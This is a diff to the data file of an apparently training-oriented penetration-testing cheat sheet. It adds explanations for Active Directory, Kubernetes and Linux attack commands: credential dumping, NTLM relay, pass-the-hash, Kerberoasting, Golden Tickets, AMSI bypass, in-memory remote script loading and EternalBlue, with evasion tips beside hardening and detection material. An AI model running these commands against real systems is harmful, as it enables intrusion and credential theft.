         "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Dumps every domain hash from an exfiltrated AD database offline:\n  impacket-secretsdump     the secrets parser\n  -ntds NTDS.dit           the copied AD database\n  -system SYSTEM           the matching SYSTEM hive (supplies the boot key to decrypt NTDS)\n  LOCAL                    parse the local files rather than connecting to a host\nProduces NT hashes and Kerberos keys for all accounts. The -M ntdsutil NetExec module can pull NTDS remotely with DA creds."
     },
     {
       "id": "smb-ntlm-relay",
@@ -33401,7 +33521,8 @@ const COMMAND_DATA = {
           "label": "Use the issued cert for a TGT",
           "command": "python3 gettgtpkinit.py -pfx-base64 <b64> <domain>/<dc>\\$ dc.ccache"
         }
-      ]
+      ],
+      "explain": "Relays a coerced NTLM authentication to ADCS web enrollment (ESC8) to mint a victim certificate:\n  impacket-ntlmrelayx      relay captured NTLM auth\n  -t http://<ca_ip>/certsrv/certfnsh.asp   the HTTP web-enrollment endpoint (no HTTPS = relayable)\n  --adcs                   request a certificate on relay success\n  -smb2support             accept SMB2 connections\n  --template <template>    the cert template to request (DomainController for a DC)\nTrigger a coercion (printerbug/PetitPotam) so a DC authenticates in; the issued cert then feeds gettgtpkinit for a DC TGT."
     },
     {
       "id": "pth-impacket",
@@ -33499,7 +33620,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Machines with identical local admin passwords (the classic PtH enabler)\n# No credential guard, no Protected Users group\n# NTLM enabled (default on all Windows versions)\n\n# Confirm NTLM is negotiated (SMB example):\n# Network capture shows NTLMSSP_AUTH frames on port 445\n\n# Accounts NOT in Protected Users group (PtH works against these):\nGet-ADGroupMember 'Protected Users'  # should list all privileged accounts\n\n# Local admin SID S-1-5-21-...-500 (RID 500) allows remote PtH by default\n# Even with UAC RemoteRestrictions, RID-500 bypasses the filter",
         "secure_config": "# 1. Enable Credential Guard (blocks NTLM hash extraction from LSASS)\n# GPO: Computer Configuration > Admin Templates > System > Device Guard\n#   'Turn on Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 2. Add privileged accounts to Protected Users group (no NTLM, no RC4)\nAdd-ADGroupMember -Identity 'Protected Users' -Members 'Domain Admins'\n\n# 3. LAPS - unique random local admin passwords per machine\n# Eliminates lateral movement via shared local admin hash\nEnable-LapsADSchema\nSet-LAPSConfig -PolicyMode Automatic -PasswordLength 20 -PasswordAgeDays 30\n\n# 4. Block NTLM (requires AES Kerberos everywhere first)\n# GPO: Security Settings > Local Policies > Security Options\n#   'Network Security: Restrict NTLM: Incoming NTLM traffic' = Deny all\n\n# 5. Disable RID-500 remote admin:\n# HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n#   LocalAccountTokenFilterPolicy = 0 (default)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Pass-the-hash to get a remote shell with impacket:\n  impacket-psexec          service-based execution (SYSTEM shell, loudest)\n  <user>@<ip>              the account and target\n  -hashes :<nt_hash>       LM:NT with the LM half blank - authenticate by NT hash, no password\nSwap the binary for wmiexec, atexec, or smbexec for quieter execution channels using the same -hashes."
     },
     {
       "id": "smb-rce-psexec",
@@ -33738,7 +33860,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
         "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
-      }
+      },
+      "explain": "Runs commands / gets a semi-interactive shell on Windows over a chosen channel:\n  impacket-wmiexec         execute over WMI (semi-interactive, relatively quiet)\n  <domain>/<user>:<password>@<ip>   credentials and target\nPick the channel by stealth and what is allowed: smbexec (SMB, no Python on target), atexec (single command via Task Scheduler), psexec (drops a service, SYSTEM, loudest). Add -hashes :<nt_hash> for pass-the-hash, or prefix proxychains to run through a pivot."
     },
     {
       "id": "ad-getuserspns-list",
@@ -33854,7 +33977,8 @@ const COMMAND_DATA = {
           "label": "Request their TGS hashes",
           "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request -outputfile hashes.txt"
         }
-      ]
+      ],
+      "explain": "Lists domain accounts that have an SPN - the Kerberoasting target list - without pulling tickets yet:\n  GetUserSPNs.py           impacket SPN enumerator\n  -dc-ip <dc_ip>           the Domain Controller to query\n  <domain>/<user>          any valid domain credential (append :<password> to authenticate)\nNo -request means pure enumeration. Note service accounts with old PasswordLastSet, then add -request to roast them."
     },
     {
       "id": "ad-getuserspns-request",
@@ -33974,7 +34098,8 @@ const COMMAND_DATA = {
           "label": "Use the cracked service-account creds",
           "command": "# check local admin / delegation for that account"
         }
-      ]
+      ],
+      "explain": "Requests TGS-REP tickets for SPN accounts and saves hashcat-ready hashes:\n  GetUserSPNs.py           impacket Kerberoaster\n  -dc-ip <dc_ip>           the Domain Controller\n  <domain>/<user>          authenticating credentials (add :<password>)\n  -request                 actually pull the TGS tickets (the encrypted ticket is the crackable material)\n  -outputfile <outfile>    write the hashes to file\nCrack offline with hashcat -m 13100; use -request-user <name> to target a single high-value account."
     },
     {
       "id": "crtp-loader",
@@ -34101,7 +34226,8 @@ const COMMAND_DATA = {
           "MITRE T1620",
           "MITRE T1562.001"
         ]
-      }
+      },
+      "explain": "CRTP's core execution primitive: unhooks ETW/AMSI in the current process, then reflectively loads a .NET assembly and runs it entirely in memory:\n  Loader.exe               the in-memory loader (no child process, nothing on disk)\n  -path <tool_path_or_url> the assembly to run - a local path or an http:// URL (fileless)\n  -args <tool_arguments>   arguments passed straight to that tool (Rubeus/SafetyKatz/Certify)\nBecause the tool never lands as a file and API hooks are removed, on-host EDR sees far less. Pair with a URL + portproxy to run tools fileless on deep hosts."
     },
     {
       "id": "cdsa-ir-lifecycle",
@@ -34355,7 +34481,8 @@ const COMMAND_DATA = {
           "MITRE T1115"
         ],
         "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands."
-      }
+      },
+      "explain": "Captures clipboard contents over time to catch copied passwords:\n  IEX(New-Object Net.WebClient).DownloadString('...Invoke-Clipboard.ps1')   fetch and load the logger in memory\n  Invoke-ClipboardLogger   start recording every clipboard change\nUsers frequently copy/paste passwords, so an active session often yields plaintext credentials."
     },
     {
       "type": "command",
@@ -34436,7 +34563,8 @@ const COMMAND_DATA = {
           "MITRE T1552"
         ],
         "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands."
-      }
+      },
+      "explain": "Polls process command lines to catch credentials passed as arguments:\n  Get-WmiObject Win32_Process | select CommandLine   snapshot every process's command line\n  sleep 1; ... Compare-Object $a $b   diff two snapshots a second apart to reveal newly launched processes\nScheduled tasks/scripts that pass passwords on the command line show up here; a helper like procmon.ps1 does this continuously."
     },
     {
       "type": "command",
@@ -34643,7 +34771,8 @@ const COMMAND_DATA = {
           "label": "Common options",
           "command": ".\\Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y"
         }
-      ]
+      ],
+      "explain": "Poisons LLMNR/NBT-NS from a Windows foothold to capture NetNTLMv2 hashes (C# Inveigh):\n  .\\Inveigh.exe            start poisoning; the interactive console (GET NTLMV2UNIQUE, HISTORY, STOP) shows captured hashes live\nThe maintained C# build (preferred over the deprecated PS version); -LLMNR Y -NBNS Y -FileOutput Y enables the poisoners and writes hashes to disk. Crack captures with hashcat -m 5600."
     },
     {
       "id": "ad-inveigh-ps",
@@ -34735,7 +34864,8 @@ const COMMAND_DATA = {
           "label": "File output + only unique",
           "command": "Invoke-Inveigh -NBNS Y -mDNS Y -FileOutput Y"
         }
-      ]
+      ],
+      "explain": "The PowerShell LLMNR/NBT-NS poisoner - Responder for a Windows-only foothold:\n  Invoke-Inveigh Y         start with defaults enabled\n  -NBNS Y                  also answer NBT-NS name queries\n  -ConsoleOutput Y         print captured hashes to the console\n  -FileOutput Y            also write them to disk\nCaptures NetNTLMv2 hashes from other hosts on the subnet (crack with hashcat -m 5600). Deprecated in favor of the C# build."
     },
     {
       "id": "crtp-invishell",
@@ -34851,7 +34981,8 @@ const COMMAND_DATA = {
           "MITRE T1574.012",
           "MITRE T1562.001"
         ]
-      }
+      },
+      "explain": "Launches a PowerShell session with AMSI, Script Block Logging, and Module Logging disabled - no admin needed - via a COR_PROFILER COM hijack under HKCU:\n  RunWithRegistryNonAdmin.bat   registers the InprocServer32 CLSID in HKCU, then starts powershell so the CLR loads InShellProf.dll as a profiler that neuters logging/AMSI\nUse the non-admin .bat (registry-based) as a low-priv user, or RunWithPathAsAdmin.bat when elevated. Then dot-source PowerView/Mimikatz quietly in that cloaked shell."
     },
     {
       "type": "command",
@@ -35053,7 +35184,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Machines with identical local admin passwords (the classic PtH enabler)\n# No credential guard, no Protected Users group\n# NTLM enabled (default on all Windows versions)\n\n# Confirm NTLM is negotiated (SMB example):\n# Network capture shows NTLMSSP_AUTH frames on port 445\n\n# Accounts NOT in Protected Users group (PtH works against these):\nGet-ADGroupMember 'Protected Users'  # should list all privileged accounts\n\n# Local admin SID S-1-5-21-...-500 (RID 500) allows remote PtH by default\n# Even with UAC RemoteRestrictions, RID-500 bypasses the filter",
         "secure_config": "# 1. Enable Credential Guard (blocks NTLM hash extraction from LSASS)\n# GPO: Computer Configuration > Admin Templates > System > Device Guard\n#   'Turn on Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 2. Add privileged accounts to Protected Users group (no NTLM, no RC4)\nAdd-ADGroupMember -Identity 'Protected Users' -Members 'Domain Admins'\n\n# 3. LAPS - unique random local admin passwords per machine\n# Eliminates lateral movement via shared local admin hash\nEnable-LapsADSchema\nSet-LAPSConfig -PolicyMode Automatic -PasswordLength 20 -PasswordAgeDays 30\n\n# 4. Block NTLM (requires AES Kerberos everywhere first)\n# GPO: Security Settings > Local Policies > Security Options\n#   'Network Security: Restrict NTLM: Incoming NTLM traffic' = Deny all\n\n# 5. Disable RID-500 remote admin:\n# HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n#   LocalAccountTokenFilterPolicy = 0 (default)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Pass-the-hash from a Windows foothold with pure PowerShell (no dropped binaries):\n  Invoke-SMBExec           execute a command over SMB\n  -Target <ip>             the victim host\n  -Domain <domain> -Username <user>   the account\n  -Hash <nt_hash>          its NT hash (authentication material)\n  -Command \"<cmd>\"         the command to run\nInvoke-WMIExec is the WMI variant. Import the Invoke-TheHash module first."
     },
     {
       "id": "cdsa-m08-ip-layer-attacks",
@@ -35869,7 +36001,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Jenkins Script Console accessible to non-admin users or anonymously. Jenkins runs as SYSTEM or domain admin. Jenkins has domain credentials in its store. No audit logging of script console usage. Jenkins accessible from workstations without WAF.",
         "vulnerable_config": "# Jenkins running as SYSTEM (check service account):\nGet-WmiObject Win32_Service -Filter {Name='Jenkins'} | Select-Object Name,StartName\n# StartName: LocalSystem = SYSTEM = CRITICAL\n\n# Script Console accessible to all authenticated users:\n# Manage Jenkins → Global Security → Authorization:\n# → 'Logged-in users can do anything' = Script Console open to all\n\n# Anonymous read access enabled (even worse):\n# Allow anonymous read access: True → Script Console publicly accessible",
         "secure_config": "# Run Jenkins as dedicated low-privilege account:\n# Services → Jenkins → Log On → This account → svc_jenkins\n# svc_jenkins: no local admin, no domain rights, no RDP\n\n# Restrict Script Console to Jenkins administrators only:\n# Manage Jenkins → Security → Enable Jenkins' own user database\n# → Project-based Matrix Authorization Strategy\n# → Only admin group has Administer permission\n\n# Block /script from non-admin hosts via reverse proxy (nginx):\n# location /script {\n#   allow 10.0.100.0/24;  # Admin VLAN only\n#   deny all;\n# }\n\n# Disable Script Console entirely if not needed:\n# Jenkins → Plugin Manager: install 'Script Security' plugin to sandbox Groovy\n\n# Sysmon rule:\n# Event 1: ParentImage contains 'java.exe' AND Image contains 'cmd.exe' → ALERT"
-      }
+      },
+      "explain": "Executes OS commands through the Jenkins Script Console (Groovy), which often runs as SYSTEM or a domain service account:\n  println                   print the result to the console output\n  'whoami'.execute().text   run the OS command and capture its stdout\nBrowse to http://<ip>:8080/script, run this to confirm RCE, then escalate (e.g. ['cmd','/c','net localgroup administrators <user> /add'].execute())."
     },
     {
       "id": "john-crack",
@@ -35996,7 +36129,8 @@ const COMMAND_DATA = {
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"john\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// offline John the Ripper crack; detect the credential dump that produced <hash_file>",
         "sigma_rules": "proc_creation_john_offline_cracking (no target-side telemetry - detect the preceding hash theft)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Cracks hashes with John the Ripper:\n  john                     the cracker\n  --wordlist=/usr/share/wordlists/rockyou.txt   dictionary mode\n  <hash_file>              the hashes\nSingle mode (--single) derives candidates from GECOS/username data (ideal for Linux passwd); --format sets the algorithm, --show reveals cracked results, --restore resumes a session."
     },
     {
       "type": "command",
@@ -36081,7 +36215,8 @@ const COMMAND_DATA = {
           "OWASP A07:2021"
         ],
         "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
-      }
+      },
+      "explain": "Brute-forces the Joomla administrator login:\n  python3 joomla-brute.py  the brute tool\n  -u http://<url>          the Joomla site\n  -w <wordlist>            the password list\n  -usr <user>              the admin username to attack\nRecovered admin access allows code execution via the template editor."
     },
     {
       "type": "payload",
@@ -36593,7 +36728,8 @@ const COMMAND_DATA = {
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"ssh2john\" or ProcessCommandLine has \"ssh2john\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// converts a protected file to a John hash locally; cracking is offline",
         "sigma_rules": "no target-side telemetry (ssh2john runs on the attacker host)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Converts a password-protected file into a John-crackable hash:\n  ssh2john.py <file>       extract the hash from a protected artifact (SSH key here; office2john/pdf2john/zip2john for others)\n  > file.hash              save it\n  john --wordlist=/usr/share/wordlists/rockyou.txt file.hash   crack it\nReveal the recovered password with john --show; locate all helpers with 'locate *2john*'."
     },
     {
       "id": "cdsa-m06-kerberoasting",
@@ -36698,7 +36834,8 @@ const COMMAND_DATA = {
           "label": "Crack",
           "command": "hashcat -m 13100 spn.txt rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Rubeus requests TGS tickets for all SPN accounts for offline cracking:\n  kerberoast               roast every account with an SPN (add /rc4opsec to avoid noisy AES downgrades)\n  /outfile:spn.txt         save the hashes\nCrack offline with hashcat -m 13100. Detect via Event 4769 with RC4 encryption or bulk TGS requests from one source; defend with 100+ char / gMSA passwords."
     },
     {
       "id": "crtp-kerberoasting",
@@ -36838,7 +36975,8 @@ const COMMAND_DATA = {
           "label": "Rubeus - simple output",
           "command": "Rubeus.exe kerberoast /simple /outfile:hashes.txt"
         }
-      ]
+      ],
+      "explain": "Requests TGS tickets for every account that has an SPN, for offline cracking:\n  kerberoast               roast all SPN accounts (add /user:<user> to target one, /stats to just list)\n  /rc4opsec                only roast accounts that support RC4, avoiding noisy AES-downgrade requests\n  /nowrap                  single-line hash output\n  /outfile:hashes.txt      save the hashes\nCrack offline with hashcat -m 13100 to recover the service account passwords."
     },
     {
       "id": "ad-faketime-kerberos",
@@ -36902,7 +37040,8 @@ const COMMAND_DATA = {
         "faketime",
         "ntpdate",
         "impacket"
-      ]
+      ],
+      "explain": "Wraps any Kerberos command so it runs with the DC's clock, curing 'KRB_AP_ERR_SKEW (Clock skew too great)' from Linux without changing your system time:\n  ntpdate -q <dc_ip>        query (do not set) the DC's current time\n  cut -d ' ' -f 1,2         take the date and time fields from that output\n  faketime \"...\" <kerberos_command>   run impacket/certipy/Rubeus/evil-winrm -k with that faked clock\nThe wrapped tool sees a time within 5 minutes of the DC, so PKINIT/AS-REQ succeeds."
     },
     {
       "id": "cdsa-m06-constrained-delegation",
@@ -37020,7 +37159,8 @@ const COMMAND_DATA = {
           "label": "Purge tickets and retry if connection fails",
           "command": "klist purge"
         }
-      ]
+      ],
+      "explain": "Abuses constrained delegation (msDS-AllowedToDelegateTo) to impersonate Administrator to an allowed service:\n  s4u                       run S4U2Self + S4U2Proxy\n  /user:<delegate_user> /rc4:<ntlm_hash>   the delegated account and its hash\n  /impersonateuser:Administrator   the user to impersonate\n  /msdsspn:\"http/<dc_hostname>\"   the service it may delegate to\n  /dc:<dc_fqdn> /ptt        the DC to ask, and inject the ticket\nThe injected ticket lets you Enter-PSSession to the DC as Administrator; /altservice pivots http to ldap/cifs/host."
     },
     {
       "id": "ad-kerberos-troubleshoot",
@@ -37189,7 +37329,8 @@ const COMMAND_DATA = {
           "label": "AES256 Golden Ticket (quieter alternative)",
           "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /ptt"
         }
-      ]
+      ],
+      "explain": "Forges a Golden Ticket with Mimikatz - a TGT signed by the krbtgt hash for arbitrary domain access:\n  kerberos::golden         forge the TGT offline\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /rc4:<krbtgt_ntlm>       the krbtgt hash used to sign (use /aes256 to be quieter)\n  /user:Administrator /id:500   impersonate Administrator (RID 500)\n  /renewmax:7 /endin:8     realistic lifetimes to blend in (vs the giveaway 10-year default)\n  /ptt                      inject into the session\nSigned with krbtgt, the KDC honors it everywhere; test with dir \\\\<dc>\\c$."
     },
     {
       "id": "kerbrute-userenum",
@@ -37293,7 +37434,8 @@ const COMMAND_DATA = {
           "label": "Brute-force one user",
           "command": "kerbrute bruteuser --dc <dc_ip> --domain <domain> <wordlist> <username>"
         }
-      ]
+      ],
+      "explain": "Validates which usernames exist in AD via Kerberos pre-auth, without lockouts:\n  kerbrute userenum        enumerate valid users from KDC responses\n  --dc <dc_ip>             the Domain Controller\n  --domain <domain>        the domain\n  <names_file>             candidate usernames\nValid users give a distinct response and no failed-logon events; confirmed accounts become spray/AS-REP-roast targets. bruteuser brute-forces one user's password instead."
     },
     {
       "id": "ad-kerbrute-spray",
@@ -37402,7 +37544,8 @@ const COMMAND_DATA = {
           "label": "Validate a hit",
           "command": "crackmapexec smb <dc_ip> -u <user> -p '<password>'"
         }
-      ]
+      ],
+      "explain": "Sprays a password over Kerberos - faster and quieter than SMB spraying:\n  kerbrute passwordspray   one AS-REQ per user (no SMB logon events)\n  -d <domain>              the domain\n  --dc <dc_ip>             the Domain Controller\n  <userlist>               usernames to try\n  <password>               the single password sprayed\nGenerates Event 4768 (less monitored) instead of 4625. Stay under the lockout threshold per observation window; validate a hit with crackmapexec."
     },
     {
       "id": "ad-kerbrute-userenum",
@@ -37643,7 +37786,8 @@ const COMMAND_DATA = {
           "label": "Pick a matching kernel exploit",
           "command": "# cross-reference the missing KB with a public LPE PoC"
         }
-      ]
+      ],
+      "explain": "Maps a host's patch state to known local exploits:\n  systeminfo               dump OS build and installed hotfixes\n  # then feed to wesng: python wes.py systeminfo.txt   match the missing KBs to LPE CVEs offline\nRun systeminfo > systeminfo.txt, then wes.py --exploits-only suggests missing-patch privesc CVEs; Sherlock/Watson do the same on-host."
     },
     {
       "type": "command",
@@ -37774,7 +37918,8 @@ const COMMAND_DATA = {
           "OWASP A06:2021"
         ],
         "evasion": "Compile off-target and transfer only the final ELF; run once and clean it up; many public PoCs are unstable - verify the kernel/arch match before firing to avoid a panic."
-      }
+      },
+      "explain": "Fingerprints the kernel to match a public local-root exploit:\n  uname -a                 print kernel version and architecture\nMatch it to a known LPE (e.g. DirtyCow on old kernels), compile the C exploit (gcc ... -o) on a matching environment, then run it and check whoami for root."
     },
     {
       "id": "cdsa-windows-event-ids-siem",
@@ -38128,7 +38273,8 @@ const COMMAND_DATA = {
           "MITRE T1610",
           "MITRE T1611"
         ]
-      }
+      },
+      "explain": "Deploys a pod that mounts the host root filesystem to escape to the node:\n  kubectl                  the K8s client\n  --token=$token           the stolen service-account token\n  --certificate-authority=ca.crt   the cluster CA cert\n  --server=https://<ip>:6443   the API server\n  apply -f privesc.yaml    create the pod defined in privesc.yaml (hostPath / mounted in)\nRequires a token that can create pods. Once running, exec in and read the node's root SSH key or write to the host filesystem."
     },
     {
       "type": "command",
@@ -38230,7 +38376,8 @@ const COMMAND_DATA = {
           "MITRE T1613",
           "MITRE T1078.004"
         ]
-      }
+      },
+      "explain": "Probes a Kubernetes cluster for anonymous access:\n  kubeletctl               Kubelet API client\n  -i                       ignore TLS certificate errors\n  --server <ip>            the node's Kubelet API (port 10250)\n  pods                     list pods running on that node\nAlso probe the API server on 6443 for anonymous access. A readable pod list points you at pods that allow command execution."
     },
     {
       "type": "command",
@@ -38341,7 +38488,8 @@ const COMMAND_DATA = {
           "MITRE T1528",
           "MITRE T1078.004"
         ]
-      }
+      },
+      "explain": "Runs a command in an exposed pod via the Kubelet API and steals its identity:\n  kubeletctl -i --server <ip>   the Kubelet API (10250), ignoring TLS errors\n  exec \"id\" -p <pod> -c <container>   execute a command in this pod/container\nThen cat /var/run/secrets/kubernetes.io/serviceaccount/token and ca.crt to grab the mounted service-account token and CA, and authenticate to the API server as that pod (kubectl auth can-i --list to see what it can do)."
     },
     {
       "id": "ad-laps-read",
@@ -38452,7 +38600,8 @@ const COMMAND_DATA = {
           "label": "Use the local admin password to move laterally",
           "command": "# psexec/winrm as the local Administrator"
         }
-      ]
+      ],
+      "explain": "Reads LAPS-managed local Administrator passwords from AD:\n  Get-LAPSComputers        list computers whose ms-Mcs-AdmPwd attribute your account can read\nLAPS stores a randomized local admin password per machine in that attribute, readable only by authorized principals; if you are one, use the returned password to log in locally and move laterally. NetExec (-M laps) and pyLAPS do the same over the network."
     },
     {
       "id": "crtp-psremoting",
@@ -38593,7 +38742,8 @@ const COMMAND_DATA = {
           "label": "WSManWinRM.exe (when winrs is blocked)",
           "command": "WSManWinRM.exe <host_fqdn> \"cmd /c <command>\""
         }
-      ]
+      ],
+      "explain": "Moves laterally over PowerShell Remoting (WinRM, 5985/5986):\n  Enter-PSSession           open an interactive remote shell\n  -ComputerName <dc_host>  the target machine\n  -Credential (Get-Credential)   the credentials to authenticate with\nUse Invoke-Command -ScriptBlock/-FilePath for non-interactive execution or to load tools remotely; New-PSSession keeps a reusable session. Beware the double-hop issue when reaching a further host."
     },
     {
       "type": "command",
@@ -38822,7 +38972,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Recovers locally stored application passwords with LaZagne:\n  LaZagne.exe all          run every module (browsers, mail clients, Wi-Fi, sysadmin tools, LSA secrets)\nAdd -vv for verbose output. It reads each app's own credential store in the current user's context; the Linux build (laZagne.py) covers Linux stores."
     },
     {
       "type": "payload",
@@ -39335,7 +39486,8 @@ const COMMAND_DATA = {
           "label": "Set target + payload + run",
           "command": "set RHOSTS <target>; set LHOST <lhost>; run"
         }
-      ]
+      ],
+      "explain": "Remotely gets SYSTEM on end-of-life Windows via SMB (Metasploit):\n  use exploit/windows/smb/ms17_010_eternalblue   load the EternalBlue module (MS17-010)\nConfirm the target is vulnerable (nmap --script smb-vuln-ms17-010), set RHOSTS/LHOST, and run for a SYSTEM shell. MS08-067 (ms08_067_netapi) covers even older XP/2003."
     },
     {
       "id": "lfi-basic",
@@ -41141,7 +41293,8 @@ const COMMAND_DATA = {
           "label": "Crack offline",
           "command": "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hashes"
         }
-      ]
+      ],
+      "explain": "Merges the Linux password files into a crackable format, then cracks them:\n  unshadow /etc/passwd /etc/shadow   combine account info with the password hashes\n  > unshadowed.hashes      write the merged file John/hashcat expect\nThen john --wordlist=rockyou.txt unshadowed.hashes. The $id$ prefix picks the mode: $6$ = sha512crypt (hashcat -m 1800), $1$ = md5crypt (-m 500)."
     },
     {
       "id": "linux-domain-check",
@@ -41242,7 +41395,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
         "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
-      }
+      },
+      "explain": "Checks whether a Linux host is joined to Active Directory:\n  realm list               show any AD/IPA realm this host is enrolled in, with its details\nIf joined, look for the auth daemon (ps -ef | grep -iE 'winbind|sssd') and the SSSD cache (/var/lib/sss/db/cache_<domain>.ldb) which holds cached domain hashes you can crack offline - AD-joined Linux is a common domain foothold."
     },
     {
       "type": "command",
@@ -41437,7 +41591,8 @@ const COMMAND_DATA = {
           "label": "Bash version",
           "command": "sudo bash mimipenguin.sh"
         }
-      ]
+      ],
+      "explain": "Harvests cleartext credentials of logged-in users from Linux process memory:\n  sudo python3 mimipenguin.py   scan memory (display managers, sudo, etc.) for plaintext passwords\nNeeds root because it reads other processes' memory - the Linux analogue of dumping LSASS. A shell (.sh) version exists for hosts without Python."
     },
     {
       "id": "linikatz",
@@ -41540,7 +41695,8 @@ const COMMAND_DATA = {
         "secure_config": "# Minimise on-disk credential/ticket caching:\n# /etc/sssd/sssd.conf\n[domain/inlanefreight.htb]\ncache_credentials = False\nkrb5_store_password_if_offline = False\n\n# Shorten Kerberos ticket lifetimes (/etc/krb5.conf):\n[libdefaults]\n  ticket_lifetime = 4h\n  renew_lifetime = 1d\n\n# Lock down access:\n# - Restrict root/sudo; monitor with auditd on /var/lib/sss/db, /etc/krb5.keytab, /tmp/krb5cc_*\n# - Do not use shared multi-user Linux hosts as domain jump boxes\n# - EDR on /proc/*/mem reads by non-standard binaries",
         "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
-      "type": "command"
+      "type": "command",
+      "explain": "The Linux answer to Mimikatz for AD-joined hosts:\n  sudo ./linikatz.sh       harvest all cached AD credentials on this host\nRuns as root and scrapes Kerberos tickets, ccache files, keytabs, and cached hashes from FreeIPA, SSSD, Samba, Vintela/VAS, PBIS, and native Kerberos, dropping them for reuse or offline cracking - a common way to pivot from a Linux foothold into the domain."
     },
     {
       "id": "linux-cred-hunt",
